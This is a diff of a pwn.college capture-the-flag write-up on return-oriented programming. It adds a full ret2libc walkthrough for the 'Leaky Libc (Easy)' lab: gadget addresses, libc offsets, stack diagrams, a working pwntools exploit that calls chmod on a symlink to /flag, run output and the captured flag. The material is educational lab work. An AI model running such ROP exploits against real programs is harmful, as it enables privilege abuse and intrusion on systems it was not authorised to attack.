@@ -823,7 +823,7 @@ Stack:
 			   ╎  .. .. .. .. .. .. .. ..  ╎
 
 ═══════════════════════════════════════════════════════════════════════════════════
-rip --> pop rdi
+rip --> pop rdi ; ret
 	// Pop the value pointed to by rsp into rdi and move the rsp by 8 bytes.
 ═══════════════════════════════════════════════════════════════════════════════════
 
@@ -1900,7 +1900,7 @@ Unique gadgets found: 158
 
 Using the information we have, and some of these ROP gadgets, we can craft an exploit which uses `chmod` to change files permissions.
 
-### ROP chain (Ret2Stack)
+### ROP chain (ret2stack)
 
 This is the ROP chain that we will be performing.
 
@@ -1963,7 +1963,7 @@ Stack:
                            ╎  .. .. .. .. .. .. .. ..  ╎
 
 ═══════════════════════════════════════════════════════════════════════════════════
-rip --> pop rdi
+rip --> pop rdi ; ret
 ═══════════════════════════════════════════════════════════════════════════════════
 
 Stack:
@@ -2013,7 +2013,7 @@ Registers:
 rdi: 0x7ffd7804eba0
 
 ═══════════════════════════════════════════════════════════════════════════════════
-rip --> pop rsi
+rip --> pop rsi ; ret
 ═══════════════════════════════════════════════════════════════════════════════════
 
 Stack:
@@ -2057,7 +2057,7 @@ rdi: 0x7ffd7804eba0
 rsi: 0o777
 
 ═══════════════════════════════════════════════════════════════════════════════════
-rip --> pop rax
+rip --> pop rax ; ret
 ═══════════════════════════════════════════════════════════════════════════════════
 
 Stack:
@@ -2445,7 +2445,7 @@ Gadgets information
 Unique gadgets found: 98
 ```
 
-### ROP chain (Ret2Stack)
+### ROP chain (ret2stack)
 
 We will be doing the same ROP chain in this challenge as the [last level](#rop-chain-ret2stack).
 
@@ -2931,7 +2931,7 @@ Out of the various options that we have, let's go with `b"!\x00"` which is at th
 - [x] Location of the stored return address to `main()`: `0x7ffd2b5e9c28`
 - [x] Location of a NULL terminated string: `0x403386`
 
-### ROP chain (Ret2Stack)
+### ROP chain (ret2stack)
 
 This is the ROP chain that we will be performing.
 
@@ -2991,7 +2991,7 @@ Stack:
                            ╎  .. .. .. .. .. .. .. ..  ╎
 
 ═══════════════════════════════════════════════════════════════════════════════════
-rip --> pop rdi
+rip --> pop rdi ; ret
 ═══════════════════════════════════════════════════════════════════════════════════
 
 Stack:
@@ -3035,7 +3035,7 @@ Registers:
 rdi: 0x403386
 
 ═══════════════════════════════════════════════════════════════════════════════════
-rip --> pop rsi
+rip --> pop rsi ; pop r15 ; ret
 ═══════════════════════════════════════════════════════════════════════════════════
 
 Stack:
@@ -3055,7 +3055,7 @@ rdi: 0x403386
 rsi: 0o777
 
 ═══════════════════════════════════════════════════════════════════════════════════
-rip --> pop r15
+rip --> pop r15 ; ret
 ═══════════════════════════════════════════════════════════════════════════════════
 
 Stack:
@@ -3091,7 +3091,7 @@ rsi: 0o777
 r15: b"BBBBBBBB"
 
 ═══════════════════════════════════════════════════════════════════════════════════
-rip --> pop rax
+rip --> pop rax ; ret
 ═══════════════════════════════════════════════════════════════════════════════════
 
 Stack:
@@ -3456,7 +3456,7 @@ Gadgets information
 Unique gadgets found: 93
 ```
 
-### ROP chain (Ret2Stack)
+### ROP chain (ret2stack)
 
 The ROP chain will be the same as the [easy version](#rop-chain-ret2stack-2).
 
@@ -4041,7 +4041,7 @@ Local exec file:
    - `pop rdx ; ret`: `0x40228e`
 - [x] Location to which flag is to be read: `0x405100`
 
-### ROP chain (Ret2PLT)
+### ROP chain (ret2plt)
 
 This is the ROP chain that we will be performing.
 
@@ -4129,7 +4129,7 @@ Stack:
                            ╎  .. .. .. .. .. .. .. ..  ╎
 
 ═══════════════════════════════════════════════════════════════════════════════════
-rip --> pop rdi
+rip --> pop rdi ; ret
 ═══════════════════════════════════════════════════════════════════════════════════
 
 Stack:
@@ -4207,7 +4207,7 @@ Function call setup:
 open("!")
 
 ═══════════════════════════════════════════════════════════════════════════════════
-rip --> pop rsi
+rip --> pop rsi ; ret
 ═══════════════════════════════════════════════════════════════════════════════════
 
 Stack:
@@ -4340,7 +4340,7 @@ Stack:
                            ╎  .. .. .. .. .. .. .. ..  ╎
 
 ═══════════════════════════════════════════════════════════════════════════════════
-rip --> pop rdi
+rip --> pop rdi ; ret
 ═══════════════════════════════════════════════════════════════════════════════════
 
 Stack:
@@ -4398,7 +4398,7 @@ Function call setup:
 read(3)
 
 ═══════════════════════════════════════════════════════════════════════════════════
-rip --> pop rsi
+rip --> pop rsi ; ret
 ═══════════════════════════════════════════════════════════════════════════════════
 
 Stack:
@@ -4450,7 +4450,7 @@ Function call setup:
 read(3, 0x405100)
 
 ═══════════════════════════════════════════════════════════════════════════════════
-rip --> pop rdx
+rip --> pop rdx ; ret
 ═══════════════════════════════════════════════════════════════════════════════════
 
 Stack:
@@ -4530,7 +4530,7 @@ Stack:
                            ╎  .. .. .. .. .. .. .. ..  ╎
 
 ═══════════════════════════════════════════════════════════════════════════════════
-rip --> pop rdi
+rip --> pop rdi ; ret
 ═══════════════════════════════════════════════════════════════════════════════════
 
 Stack:
@@ -5039,7 +5039,7 @@ Local exec file:
    - `pop rdx ; ret`: `0x401bfd`
 - [x] Location to which flag is to be read: `0x404100`
 
-### ROP chain (Ret2PLT)
+### ROP chain (ret2plt)
 
 The ROP chain will be the same as the [easy version](#rop-chain-ret2plt).
 
@@ -5132,107 +5132,11 @@ present in it for your ROP chain.
 
 ```
 
-### Location of `execve()`
+Let's take a look at the gadgets.
 
-```
-hacker@return-oriented-programming~leaky-libc-easy:/$ ldd /challenge/leveraging-libc-easy 
-        linux-vdso.so.1 (0x00007fffec922000)
-        libcapstone.so.5 => /lib/libcapstone.so.5 (0x000074471541f000)
-        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x0000744715419000)
-        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x0000744715227000)
-        /lib64/ld-linux-x86-64.so.2 (0x0000744716461000)
-```
+### Binary Analysis
 
-```
-hacker@return-oriented-programming~leaky-libc-easy:/$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "execve"
-  1055: 00000000000e31a0   299 FUNC    GLOBAL DEFAULT   15 fexecve@@GLIBC_2.2.5
-  1520: 00000000000e3170    37 FUNC    WEAK   DEFAULT   15 execve@@GLIBC_2.2.5
-```
-
-```
-hacker@return-oriented-programming~leaky-libc-easy:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "chmod"
-   125: 000000000010ddb0    37 FUNC    WEAK   DEFAULT   15 fchmod@@GLIBC_2.2.5
-   631: 000000000010dd80    37 FUNC    WEAK   DEFAULT   15 chmod@@GLIBC_2.2.5
-  1015: 000000000010de00   108 FUNC    GLOBAL DEFAULT   15 fchmodat@@GLIBC_2.4
-  2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
-```
-
-```
-hacker@return-oriented-programming~leaky-libc-easy:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
-  1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
-```
-
-
-### null terminated string
-
-```
-hacker@return-oriented-programming~leaky-libc-easy:/$ objdump -s -j .rodata /challenge/leveraging-libc-easy | grep -E "[0-9a-f]{2}00"
- 402000 01000200 00000000 2b2d2d2d 2d2d2d2d  ........+-------
- 402050 2d2d2d2d 2d2d2d2d 2d2b0044 61746120  ---------+.Data 
- 402070 79746573 29005374 61636b20 6c6f6361  ytes).Stack loca
- 402090 3373207c 20253138 73207c0a 00000000  3s | %18s |.....
- 4020e0 78207c20 30782530 31366c78 207c0a00  x | 0x%016lx |..
- 402100 6c657220 6661696c 65642074 6f20696e  ler failed to in
- 402110 69746961 6c697a65 2e007c20 30782530  itialize..| 0x%0
- 402120 31366c78 3a200028 554e4d41 50504544  16lx: .(UNMAPPED
- 402140 20007265 74006361 6c6c0028 44495341   .ret.call.(DISA
- 402150 5353454d 424c5920 4552524f 52292000  SSEMBLY ERROR) .
- 402160 25303268 68782000 0a2b2d2d 2d205072  %02hhx ..+--- Pr
- 402190 61742025 702e0a00 54686973 20636861  at %p...This cha
- 402200 20746869 73207365 72696573 206f6600   this series of.
- 402270 00000000 00000000 41534c52 206d6561  ........ASLR mea
- 4022b0 6e2c0000 00000000 62757420 49207769  n,......but I wi
- 4022e0 6f66206c 6962632e 00000000 00000000  of libc.........
- 402300 206c6962 63206973 2c20796f 75206361   libc is, you ca
- 402330 6e74206f 66206761 64676574 73000000  nt of gadgets...
- 402360 2e007379 7374656d 00000000 00000000  ..system........
- 4023a0 00000000 00000000 52656365 69766564  ........Received
- 4023d0 64206761 64676574 732e0a00 00000000  d gadgets.......
- 402400 204e6f74 65207468 61742077 65206861   Note that we ha
- 402440 626c6500 00000000 66726f6d 20776974  ble.....from wit
- 402480 796f7572 73656c66 2e004c65 6176696e  yourself..Leavin
- 402490 67210023 23230023 23232057 656c636f  g!.###.### Welco
- 4024a0 6d652074 6f202573 210a0023 23232047  me to %s!..### G
- 4024b0 6f6f6462 79652100                    oodbye!.  
-```
-
-### bss
-
-```
-pwndbg> info files
-Symbols from "/challenge/leveraging-libc-easy".
-Local exec file:
-        `/challenge/leveraging-libc-easy', file type elf64-x86-64.
-        Entry point: 0x4011d0
-        0x0000000000400318 - 0x0000000000400334 is .interp
-        0x0000000000400338 - 0x0000000000400358 is .note.gnu.property
-        0x0000000000400358 - 0x000000000040037c is .note.gnu.build-id
-        0x000000000040037c - 0x000000000040039c is .note.ABI-tag
-        0x00000000004003a0 - 0x00000000004003c8 is .gnu.hash
-        0x00000000004003c8 - 0x0000000000400578 is .dynsym
-        0x0000000000400578 - 0x0000000000400643 is .dynstr
-        0x0000000000400644 - 0x0000000000400668 is .gnu.version
-        0x0000000000400668 - 0x00000000004006a8 is .gnu.version_r
-        0x00000000004006a8 - 0x0000000000400708 is .rela.dyn
-        0x0000000000400708 - 0x0000000000400840 is .rela.plt
-        0x0000000000401000 - 0x000000000040101b is .init
-        0x0000000000401020 - 0x0000000000401100 is .plt
-        0x0000000000401100 - 0x00000000004011d0 is .plt.sec
-        0x00000000004011d0 - 0x0000000000401e05 is .text
-        0x0000000000401e08 - 0x0000000000401e15 is .fini
-        0x0000000000402000 - 0x00000000004024b8 is .rodata
-        0x00000000004024b8 - 0x0000000000402524 is .eh_frame_hdr
-        0x0000000000402528 - 0x00000000004026d0 is .eh_frame
-        0x0000000000403df0 - 0x0000000000403df8 is .init_array
-        0x0000000000403df8 - 0x0000000000403e00 is .fini_array
-        0x0000000000403e00 - 0x0000000000403ff0 is .dynamic
-        0x0000000000403ff0 - 0x0000000000404000 is .got
-        0x0000000000404000 - 0x0000000000404080 is .got.plt
-        0x0000000000404080 - 0x0000000000404090 is .data
-        0x0000000000404090 - 0x00000000004040e8 is .bss
-```
-
-### rop gadgets
+#### ROP gadgets
 
 ```
 hacker@return-oriented-programming~leaky-libc-easy:/$ ROPgadget --binary /challenge/leveraging-libc-easy 
@@ -5373,10 +5277,56 @@ Gadgets information
 Unique gadgets found: 131
 ```
 
-### padding bytes
+- [ ] Offset between buffer and stored return address to `main()`
+- [ ] Location of a NULL terminated string
+- [ ] Offsets of required Libc functions
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x401df3`
+   - `pop rsi ; pop r15 ; ret`: `0x401df1`
+
+As expected, there is no syscall gadget.
+Since the challenge program leaks the address of `system()` within Libc, we can call the necessary the Libc functions directly instead.
+
+#### Libc functions
+
+Let's first the offset `system()` within Libc from the base address of the Libc.
 
 ```
-pwndbg> disass challenge
+hacker@return-oriented-programming~leaky-libc-easy:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
+  1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
+```
+
+- [ ] Offset between buffer and stored return address to `main()`
+- [ ] Location of a NULL terminated string
+- [ ] Offsets of required Libc functions
+   - Offset of `system()` within Libc: `0x52290`
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x401df3`
+   - `pop rsi ; pop r15 ; ret`: `0x401df1`
+
+Now that we can calculate the Libc base address given the leak, let's find the offset of the `chmod()` function within Libc.
+
+```
+hacker@return-oriented-programming~leaky-libc-easy:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "chmod"
+   125: 000000000010ddb0    37 FUNC    WEAK   DEFAULT   15 fchmod@@GLIBC_2.2.5
+   631: 000000000010dd80    37 FUNC    WEAK   DEFAULT   15 chmod@@GLIBC_2.2.5
+  1015: 000000000010de00   108 FUNC    GLOBAL DEFAULT   15 fchmodat@@GLIBC_2.4
+  2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
+```
+
+- [ ] Offset between buffer and stored return address to `main()`
+- [ ] Location of a NULL terminated string
+- [x] Offsets of required Libc functions
+   - Offset of `system()` within Libc: `0x52290`
+   - Offset of `chmod()` within Libc: `0x10dd80`
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x401df3`
+   - `pop rsi ; pop r15 ; ret`: `0x401df1`
+
+#### `challenge()`
+
+```
+pwndbg> disassemble challenge
 Dump of assembler code for function challenge:
    0x0000000000401b52 <+0>:     endbr64
    0x0000000000401b56 <+4>:     push   rbp
@@ -5465,9 +5415,14 @@ Dump of assembler code for function challenge:
 End of assembler dump.
 ```
 
+Let's set a breakpoint at `challenge+235` and run.
+
 ```
 pwndbg> break *(challenge+235)
 Breakpoint 1 at 0x401c3d
+```
+
+```
 pwndbg> run
 Starting program: /challenge/leveraging-libc-easy 
 ###
@@ -5534,6 +5489,11 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
    2   0x717360c8d083 __libc_start_main+243
    3         0x4011fe _start+46
 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+Lets get the address of the stored return pointer.
+
+```
 pwndbg> info frame
 Stack level 0, frame at 0x7ffd64369f40:
  rip = 0x401c3d in challenge; saved rip = 0x401d7a
@@ -5544,112 +5504,294 @@ Stack level 0, frame at 0x7ffd64369f40:
   rbp at 0x7ffd64369f30, rip at 0x7ffd64369f38
 ```
 
+```
+pwndbg> p/d 0x7ffd64369f38 - 0x7ffd64369ec0
+$1: 120
+```
+
+- [x] Offset between buffer and stored return address to `main()`: `120`
+   - Location of the buffer: `0x7ffd64369ec0`
+   - Location of the stored return address to `main()`: `0x7ffd64369f38`
+- [ ] Location of a NULL terminated string
+- [x] Offsets of required Libc functions
+   - Offset of `system()` within Libc: `0x52290`
+   - Offset of `chmod()` within Libc: `0x10dd80`
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x401df3`
+   - `pop rsi ; pop r15 ; ret`: `0x401df1`
+
+Let's find a string we can use a symlink.
+
+```
+hacker@return-oriented-programming~leaky-libc-easy:/$ objdump -s -j .rodata /challenge/leveraging-libc-easy | grep -E "[0-9a-f]{2}00"
+ 402000 01000200 00000000 2b2d2d2d 2d2d2d2d  ........+-------
+ 402050 2d2d2d2d 2d2d2d2d 2d2b0044 61746120  ---------+.Data 
+ 402070 79746573 29005374 61636b20 6c6f6361  ytes).Stack loca
+ 402090 3373207c 20253138 73207c0a 00000000  3s | %18s |.....
+ 4020e0 78207c20 30782530 31366c78 207c0a00  x | 0x%016lx |..
+ 402100 6c657220 6661696c 65642074 6f20696e  ler failed to in
+ 402110 69746961 6c697a65 2e007c20 30782530  itialize..| 0x%0
+ 402120 31366c78 3a200028 554e4d41 50504544  16lx: .(UNMAPPED
+ 402140 20007265 74006361 6c6c0028 44495341   .ret.call.(DISA
+ 402150 5353454d 424c5920 4552524f 52292000  SSEMBLY ERROR) .
+ 402160 25303268 68782000 0a2b2d2d 2d205072  %02hhx ..+--- Pr
+ 402190 61742025 702e0a00 54686973 20636861  at %p...This cha
+ 402200 20746869 73207365 72696573 206f6600   this series of.
+ 402270 00000000 00000000 41534c52 206d6561  ........ASLR mea
+ 4022b0 6e2c0000 00000000 62757420 49207769  n,......but I wi
+ 4022e0 6f66206c 6962632e 00000000 00000000  of libc.........
+ 402300 206c6962 63206973 2c20796f 75206361   libc is, you ca
+ 402330 6e74206f 66206761 64676574 73000000  nt of gadgets...
+ 402360 2e007379 7374656d 00000000 00000000  ..system........
+ 4023a0 00000000 00000000 52656365 69766564  ........Received
+ 4023d0 64206761 64676574 732e0a00 00000000  d gadgets.......
+ 402400 204e6f74 65207468 61742077 65206861   Note that we ha
+ 402440 626c6500 00000000 66726f6d 20776974  ble.....from wit
+ 402480 796f7572 73656c66 2e004c65 6176696e  yourself..Leavin
+ 402490 67210023 23230023 23232057 656c636f  g!.###.### Welco
+ 4024a0 6d652074 6f202573 210a0023 23232047  me to %s!..### G
+ 4024b0 6f6f6462 79652100                    oodbye!.  
+```
+
+- [x] Offset between buffer and stored return address to `main()`: `120`
+   - Location of the buffer: `0x7ffd64369ec0`
+   - Location of the stored return address to `main()`: `0x7ffd64369f38`
+- [x] Location of a NULL terminated string: `0x402491`
+- [x] Offsets of required Libc functions
+   - Offset of `system()` within Libc: `0x52290`
+   - Offset of `chmod()` within Libc: `0x10dd80`
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x401df3`
+   - `pop rsi ; pop r15 ; ret`: `0x401df1`
+
+
+### ROP chain (ret2libc)
+
+This is what the ROP chain would look like.
+
+```
+<== Value is stored at the address
+<-- Points to the address
+
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+            0x7ffd64369ec0 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c20 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+    rsp --> 0x7ffd64369f38 │  00 00 00 00 00 40 1d f3  │ --> ( pop rdi ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd64369f40 │  00 00 00 00 00 40 24 91  │ --> ( b"!\x00" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd64369f48 │  00 00 00 00 00 40 1d f1  │ --> ( pop rsi ; pop r15 ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd64369f50 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd64369f58 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd64369f60 │    libc base + offset     │ --> ( chmod in Libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> challenge() return
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffd64369f40 │  00 00 00 00 00 40 24 91  │ --> ( b"!\x00" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd64369f48 │  00 00 00 00 00 40 1d f1  │ --> ( pop rsi ; pop r15 ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd64369f50 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd64369f58 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd64369f60 │    libc base + offset     │ --> ( chmod in Libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop rdi ; ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffd64369f48 │  00 00 00 00 00 40 1d f1  │ --> ( pop rsi ; pop r15 ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd64369f50 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd64369f58 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd64369f60 │    libc base + offset     │ --> ( chmod in Libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x402491
+
+Function call setup:
+chmod("!")
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffd64369f50 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd64369f58 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd64369f60 │    libc base + offset     │ --> ( chmod in Libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x402491
+
+Function call setup:
+chmod("!")
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop rsi ; pop r15 ; ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffd64369f58 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd64369f60 │    libc base + offset     │ --> ( chmod in Libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x402491
+rsi: 0x1ff
+
+Function call setup:
+chmod("!", 0o777)
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop r15 ; ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffd64369f60 │    libc base + offset     │ --> ( chmod in Libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x402491
+rsi: 0x1ff
+r15: b"BBBBBBBB"
+
+Function call setup:
+chmod("!", 0o777)
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffd64369f68 │  .. .. .. .. .. .. .. ..  │
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x402491
+rsi: 0x1ff
+r15: b"BBBBBBBB"
+
+Function call setup:
+chmod("!", 0o777)
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> chmod("!", 0o777)
+═══════════════════════════════════════════════════════════════════════════════════
+```
+
 ### Exploit
 
-```c
-#include <unistd.h>
-#include <fcntl.h>
-
-void main() {
-    // Open the flag
-    int fd = open("/flag", 0); 
-    char buf[100];
-    // Read the flag
-    int n = read(fd, buf, 100);
-    // Print to your screen (stdout)
-    write(1, buf, n);
-}
+```
+hacker@return-oriented-programming~leaky-libc-easy:~$ ln -sf /flag ~/!
 ```
 
-```
-hacker@return-oriented-programming~leaky-libc-easy:/$ gcc ~/catflag.c -o ~/!
-hacker@return-oriented-programming~leaky-libc-easy:/$ chmod +x ~/!
-hacker@return-oriented-programming~leaky-libc-easy:/$ ls -l ~/!
--rwxr-xr-x 1 hacker hacker 16040 Jan 18 04:17 '/home/hacker/!'
-```
-
-```py
-ffrom pwn import *
-import os
-
-# Ensure the symlink is in the CURRENT directory
-os.system("ln -sf /flag !")
-
-p = process('/challenge/leveraging-libc-easy')
-
-# 1. Parse Leak
-p.recvuntil(b'is: ')
-leaked_line = p.recvline().strip().decode()
-leaked_system = int(leaked_line.rstrip('.'), 16)
-
-# 2. Addresses
-libc_base = leaked_system - 0x52290
-chmod_addr = libc_base + 0x10dd80
-ret_gadget = 0x40101a 
-pop_rdi = 0x401df3
-pop_rsi_r15 = 0x401df1
-
-# CORRECTED ADDRESS: 0x402491 is '!', 0x402492 is NULL
-symlink_str = 0x402491 
-
-log.info(f"Libc Base: {hex(libc_base)}")
-log.info(f"Targeting address {hex(symlink_str)} for string '!'")
-
-# 3. Payload
-padding = b"A" * 120
-payload = [
-    padding,
-    p64(ret_gadget),    # Stack alignment
-    p64(pop_rdi),
-    p64(symlink_str),
-    p64(pop_rsi_r15),
-    p64(0o777),         # Mode
-    p64(0),             # junk for r15
-    p64(chmod_addr)
-]
-
-p.send(b"".join(payload))
-
-# Wait for process to finish executing the ROP chain
-p.wait()
-
-print("\n--- Verification ---")
-os.system("ls -l /flag")
-os.system("cat /flag")
-```
-
-```py
+```py title="~/script.py" showLineNumbers
 from pwn import *
 
 context.arch = 'amd64'
 
-# Binary specific gadgets and data
+# ROP gadgets
 pop_rdi = 0x401df3
-pop_rsi_r15 = 0x401df1
-ret_gadget = 0x40101a
+pop_rsi_pop_r15 = 0x401df1
+
+# Memory addresses and offsets
 bang_addr = 0x402491 
 offset = 120
-
-# Calculate the base address of libc and the address of chmod
-libc_base = leaked_system - 0x52290
-chmod_libc = libc_base + 0x10dd80
 
 p = process('/challenge/leveraging-libc-easy')
 
 # Parse leak and calculate chmod
 p.recvuntil(b'is: ')
 leaked_line = p.recvline().strip().decode()
-leaked_system = int(leaked_line.rstrip('.'), 16)
+system_libc = int(leaked_line.rstrip('.'), 16)
+
+# Calculate the base address of libc and the address of chmod
+libc_base = system_libc - 0x52290
+chmod_libc = libc_base + 0x10dd80
 
 # Build payload
 payload = flat(
     b"A" * offset,
-    ret_gadget,
+
+    # chmod("!", 0o777)
     pop_rdi, bang_addr,
-    pop_rsi_r15, 0o777, 0,
+    pop_rsi_pop_r15, 0o777, b"B" * 8,
     chmod_libc
 )
 
+# Send payload
 p.send(payload)
 p.interactive()
 ```
+
+```
+hacker@return-oriented-programming~leaky-libc-easy:~$ python ~/script.py
+[+] Starting local process '/challenge/leveraging-libc-easy': pid 7005
+[*] Switching to interactive mode
+
+[*] Process '/challenge/leveraging-libc-easy' stopped with exit code 0 (pid 7005)
+Received 168 bytes! This is potentially 6 gadgets.
+Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
+from within this challenge. You will have to do that by yourself.
+
++--- Printing 7 gadgets of ROP chain at 0x7ffcc5b993c8.
+| 0x0000000000401df3: pop rdi ; ret  ; 
+| 0x0000000000402491: and dword ptr [rax], eax ; and esp, dword ptr [rbx] ; and eax, dword ptr [rax] ; and esp, dword ptr [rbx] ; and esp, dword ptr [rax] ; push rdi ; insb byte ptr [rdi], dx ; 
+| 0x0000000000401df1: pop rsi ; pop r15 ; ret  ; 
+| 0x00000000000001ff: (UNMAPPED MEMORY)
+| 0x4242424242424242: (UNMAPPED MEMORY)
+| 0x00007f202f3ffd80: endbr64  ; mov eax, 0x5a ; syscall  ; cmp rax, -0xfff ; jae 0x7f202f3ffd94 ; ret  ; 
+| 0x00007f202f316083: mov edi, eax ; call 0x7f202f338a40 ; 
+
+Leaving!
+[*] Got EOF while reading in interactive
+$  
+```
+
+```
+hacker@return-oriented-programming~leaky-libc-easy:~$ cat /flag 
+pwn.college{0X2Qv1IB1Fh0nc96eFbVa6PYllf.01M1MDL4ITM0EzW}
+```
+
+&nbsp;
+
+## Leaky Libc (Hard)
